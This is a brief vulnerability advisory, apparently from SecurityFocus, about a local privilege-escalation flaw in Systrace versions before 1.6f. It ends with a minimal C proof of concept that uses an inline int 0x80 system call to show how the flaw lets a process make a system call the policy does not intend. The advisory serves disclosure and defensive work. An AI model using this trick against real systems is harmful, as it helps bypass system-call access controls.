source: http://www.securityfocus.com/bid/33417/info

Systrace is prone to a local privilege-escalation vulnerability.

A local attacker may be able to exploit this issue to bypass access control restrictions and make unintended system calls, which may result in an elevation of privileges.

Versions prior to Systrace 1.6f are vulnerable.

int
main(int argc, const char* argv[])
{
  /* Syscall 1 is exit on i386 but write on x86_64. */
  asm volatile("movl $1, %eax\n"
               "int $0x80\n");
  for (;;);
}

